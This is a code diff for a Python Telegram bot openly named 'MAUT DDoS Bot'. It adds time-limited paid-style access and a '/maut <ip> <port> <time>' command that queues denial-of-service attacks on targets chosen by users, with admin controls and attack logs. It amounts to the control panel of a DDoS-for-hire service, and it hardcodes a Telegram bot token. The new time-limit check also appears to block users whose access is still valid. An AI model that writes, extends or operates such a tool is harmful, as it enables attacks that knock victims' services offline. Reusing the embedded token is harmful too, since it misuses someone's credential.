@@ -4,11 +4,13 @@ import datetime
 import os
 from telebot import types
 import time
+import re
 
 # Bot configuration
 bot = telebot.TeleBot('7970310406:AAGh47IMJxhCPwqTDe_3z3PCvXugf7Y3yYE')
 admin_id = {"8167507955"}
 USER_FILE = "users.txt"
+USER_TIME_LIMITS = "user_limits.txt"  # New file for storing time limits
 LOG_FILE = "attack_logs.txt"
 COOLDOWN_TIME = 300  # 5 minutes
 MAX_ATTACK_TIME = 180  # 3 minutes
@@ -18,18 +20,33 @@ IMAGE_URL = "https://t.me/gggkkkggggiii/8"
 user_attack_data = {}
 maut_cooldown = {}
 allowed_user_ids = []
+user_time_limits = {}  # {user_id: (limit_seconds, expiry_timestamp)}
 
 def load_users():
-    global allowed_user_ids
+    global allowed_user_ids, user_time_limits
     try:
         with open(USER_FILE, "r") as f:
             allowed_user_ids = f.read().splitlines()
     except FileNotFoundError:
         allowed_user_ids = []
+    
+    # Load time limits
+    try:
+        with open(USER_TIME_LIMITS, "r") as f:
+            for line in f:
+                user_id, limit_sec, expiry = line.strip().split("|")
+                user_time_limits[user_id] = (int(limit_sec), float(expiry))
+    except FileNotFoundError:
+        user_time_limits = {}
 
 def save_users():
     with open(USER_FILE, "w") as f:
         f.write("\n".join(allowed_user_ids))
+    
+    # Save time limits
+    with open(USER_TIME_LIMITS, "w") as f:
+        for user_id, (limit_sec, expiry) in user_time_limits.items():
+            f.write(f"{user_id}|{limit_sec}|{expiry}\n")
 
 def log_attack(user_id, target, port, time):
     try:
@@ -40,6 +57,27 @@ def log_attack(user_id, target, port, time):
     except Exception as e:
         print(f"Logging error: {e}")
 
+def parse_time_input(time_str):
+    """Parse time input like 1day, 2hours, 30min into seconds"""
+    time_str = time_str.lower()
+    total_seconds = 0
+    
+    # Find all number-unit pairs
+    matches = re.findall(r'(\d+)\s*(day|hour|min|sec|d|h|m|s)', time_str)
+    
+    for amount, unit in matches:
+        amount = int(amount)
+        if unit in ['day', 'd']:
+            total_seconds += amount * 86400
+        elif unit in ['hour', 'h']:
+            total_seconds += amount * 3600
+        elif unit in ['min', 'm']:
+            total_seconds += amount * 60
+        elif unit in ['sec', 's']:
+            total_seconds += amount
+    
+    return total_seconds if total_seconds > 0 else None
+
 # Start command with image and instructions
 @bot.message_handler(commands=['start'])
 def start_command(message):
@@ -47,13 +85,13 @@ def start_command(message):
 🚀 *Welcome to MAUT DDoS Bot* 🚀
 
 *Available Commands:*
-/maut - Start a new attack
+/maut - Start a new attack (ip port time)
 /mylogs - View your attack history
 /help - Show all commands
 /rules - Usage guidelines
 
 *Admin Commands:*
-/add - Add new user
+/add - Add new user with time limit
 /remove - Remove user
 /allusers - List all users
 /logs - View all attack logs
@@ -73,9 +111,9 @@ def start_command(message):
         bot.reply_to(message, caption, parse_mode="Markdown")
         print(f"Error sending image: {e}")
 
-# Interactive attack flow
+# Improved attack command that accepts all parameters at once
 @bot.message_handler(commands=['maut'])
-def start_attack(message):
+def handle_attack_command(message):
     user_id = str(message.chat.id)
     if user_id not in allowed_user_ids:
         return bot.reply_to(message, "❌ Access denied. Contact admin.")
@@ -85,54 +123,67 @@ def start_attack(message):
         if remaining > 0:
             return bot.reply_to(message, f"⏳ Cooldown active. Wait {remaining} seconds.")
     
-    msg = bot.reply_to(message, "🌐 Enter target IP:")
-    bot.register_next_step_handler(msg, get_attack_ip)
-
-def get_attack_ip(message):
-    user_id = str(message.chat.id)
-    ip = message.text.strip()
-    if not ip.replace('.', '').isdigit():
-        return bot.reply_to(message, "❌ Invalid IP. Use /maut to restart.")
+    # Check if user has time limit
+    if user_id in user_time_limits:
+        limit_sec, expiry = user_time_limits[user_id]
+        if time.time() > expiry:
+            del user_time_limits[user_id]
+            save_users()
+        else:
+            remaining_time = expiry - time.time()
+            hours = int(remaining_time // 3600)
+            mins = int((remaining_time % 3600) // 60)
+            return bot.reply_to(message, f"⏳ Your access expires in {hours}h {mins}m")
     
-    user_attack_data[user_id] = {'ip': ip}
-    msg = bot.reply_to(message, "🔌 Enter target port:")
-    bot.register_next_step_handler(msg, get_attack_port)
-
-def get_attack_port(message):
-    user_id = str(message.chat.id)
-    port = message.text.strip()
-    if not port.isdigit() or not 1 <= int(port) <= 65535:
-        return bot.reply_to(message, "❌ Invalid port (1-65535). Use /maut to restart.")
-    
-    user_attack_data[user_id]['port'] = port
-    msg = bot.reply_to(message, f"⏱ Enter attack time (1-{MAX_ATTACK_TIME} seconds):")
-    bot.register_next_step_handler(msg, get_attack_time)
-
-def get_attack_time(message):
-    user_id = str(message.chat.id)
-    attack_time = message.text.strip()
-    if not attack_time.isdigit() or not 1 <= int(attack_time) <= MAX_ATTACK_TIME:
-        return bot.reply_to(message, f"❌ Invalid time (1-{MAX_ATTACK_TIME}s). Use /maut to restart.")
-    
-    user_attack_data[user_id]['time'] = attack_time
-    data = user_attack_data[user_id]
-    
-    markup = types.InlineKeyboardMarkup()
-    markup.add(
-        types.InlineKeyboardButton("✅ Start Attack", callback_data="start_attack"),
-        types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")
-    )
-    
-    bot.send_message(
-        message.chat.id,
-        f"⚡ *Attack Summary:*\n\n"
-        f"🌐 IP: `{data['ip']}`\n"
-        f"🔌 Port: `{data['port']}`\n"
-        f"⏱ Time: `{data['time']}`s\n\n"
-        f"Confirm attack:",
-        parse_mode="Markdown",
-        reply_markup=markup
-    )
+    # Parse command arguments
+    try:
+        args = message.text.split()
+        if len(args) != 4:
+            return bot.reply_to(message, "❌ Usage: /maut <ip> <port> <time>")
+        
+        ip = args[1]
+        port = args[2]
+        attack_time = args[3]
+        
+        # Validate IP
+        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
+            return bot.reply_to(message, "❌ Invalid IP format")
+        
+        # Validate port
+        if not port.isdigit() or not 1 <= int(port) <= 65535:
+            return bot.reply_to(message, "❌ Invalid port (1-65535)")
+        
+        # Validate time
+        if not attack_time.isdigit() or not 1 <= int(attack_time) <= MAX_ATTACK_TIME:
+            return bot.reply_to(message, f"❌ Invalid time (1-{MAX_ATTACK_TIME}s)")
+        
+        # Store attack data
+        user_attack_data[user_id] = {
+            'ip': ip,
+            'port': port,
+            'time': attack_time
+        }
+        
+        # Show confirmation
+        markup = types.InlineKeyboardMarkup()
+        markup.add(
+            types.InlineKeyboardButton("✅ Start Attack", callback_data="start_attack"),
+            types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")
+        )
+        
+        bot.send_message(
+            message.chat.id,
+            f"⚡ *Attack Summary:*\n\n"
+            f"🌐 IP: `{ip}`\n"
+            f"🔌 Port: `{port}`\n"
+            f"⏱ Time: `{attack_time}`s\n\n"
+            f"Confirm attack:",
+            parse_mode="Markdown",
+            reply_markup=markup
+        )
+        
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {str(e)}")
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_buttons(call):
@@ -183,12 +234,11 @@ def handle_buttons(call):
             if remaining > 0:
                 return bot.answer_callback_query(call.id, f"⏳ Wait {remaining} seconds")
         
-        msg = bot.send_message(call.message.chat.id, "🌐 Enter target IP for new attack:")
-        bot.register_next_step_handler(msg, get_attack_ip)
+        bot.send_message(call.message.chat.id, "⚡ Send new attack command:\n`/maut <ip> <port> <time>`", parse_mode="Markdown")
     
     bot.answer_callback_query(call.id)
 
-# Admin commands
+# Improved add command with time limit
 @bot.message_handler(commands=['add'])
 def add_user(message):
     user_id = str(message.chat.id)
@@ -196,15 +246,41 @@ def add_user(message):
         return bot.reply_to(message, "❌ Admin only command.")
     
     try:
-        new_user = message.text.split()[1]
+        args = message.text.split(maxsplit=2)
+        if len(args) < 3:
+            return bot.reply_to(message, "❌ Usage: /add <user_id> <time_limit>\nExample: /add 123456 1day2hours")
+        
+        new_user = args[1]
+        time_limit = args[2]
+        
         if new_user in allowed_user_ids:
             return bot.reply_to(message, "ℹ️ User already exists.")
         
+        # Parse time limit
+        limit_seconds = parse_time_input(time_limit)
+        if not limit_seconds:
+            return bot.reply_to(message, "❌ Invalid time format. Use like: 1day, 2hours30min")
+        
+        expiry_timestamp = time.time() + limit_seconds
+        user_time_limits[new_user] = (limit_seconds, expiry_timestamp)
         allowed_user_ids.append(new_user)
         save_users()
-        bot.reply_to(message, f"✅ User {new_user} added.")
-    except:
-        bot.reply_to(message, "❌ Usage: /add <user_id>")
+        
+        # Convert seconds to readable format
+        days = limit_seconds // 86400
+        hours = (limit_seconds % 86400) // 3600
+        minutes = (limit_seconds % 3600) // 60
+        seconds = limit_seconds % 60
+        
+        time_str = []
+        if days: time_str.append(f"{days} day{'s' if days>1 else ''}")
+        if hours: time_str.append(f"{hours} hour{'s' if hours>1 else ''}")
+        if minutes: time_str.append(f"{minutes} minute{'s' if minutes>1 else ''}")
+        if seconds: time_str.append(f"{seconds} second{'s' if seconds>1 else ''}")
+        
+        bot.reply_to(message, f"✅ User {new_user} added with limit: {' '.join(time_str)}")
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {str(e)}\nUsage: /add <user_id> <time_limit>\nExample: /add 123456 1day2hours")
 
 @bot.message_handler(commands=['remove'])
 def remove_user(message):
@@ -218,6 +294,8 @@ def remove_user(message):
             return bot.reply_to(message, "❌ User not found.")
         
         allowed_user_ids.remove(user_to_remove)
+        if user_to_remove in user_time_limits:
+            del user_time_limits[user_to_remove]
         save_users()
         bot.reply_to(message, f"✅ User {user_to_remove} removed.")
     except:
@@ -232,8 +310,24 @@ def list_users(message):
     if not allowed_user_ids:
         return bot.reply_to(message, "ℹ️ No users found.")
     
-    users_list = "\n".join(allowed_user_ids)
-    bot.reply_to(message, f"👥 Authorized Users:\n\n{users_list}")
+    users_list = []
+    now = time.time()
+    
+    for user in allowed_user_ids:
+        if user in user_time_limits:
+            limit_sec, expiry = user_time_limits[user]
+            if now < expiry:
+                remaining = expiry - now
+                days = int(remaining // 86400)
+                hours = int((remaining % 86400) // 3600)
+                mins = int((remaining % 3600) // 60)
+                users_list.append(f"🟢 {user} (Expires in: {days}d {hours}h {mins}m)")
+            else:
+                users_list.append(f"🔴 {user} (Expired)")
+        else:
+            users_list.append(f"🟡 {user} (No limit)")
+    
+    bot.reply_to(message, "👥 Authorized Users:\n\n" + "\n".join(users_list))
 
 @bot.message_handler(commands=['logs'])
 def show_logs(message):
@@ -287,14 +381,14 @@ def help_command(message):
 🛠 *MAUT Bot Help* 🛠
 
 *User Commands:*
-/maut - Start new attack
+/maut <ip> <port> <time> - Start new attack
 /mylogs - View your attack history
 /rules - Usage guidelines
 
 *Admin Commands:*
-/add - Add new user
-/remove - Remove user
-/allusers - List users
+/add <user_id> <time> - Add new user (e.g. 1day2hours)
+/remove <user_id> - Remove user
+/allusers - List users with status
 /logs - View all logs
 /clearlogs - Clear logs
 
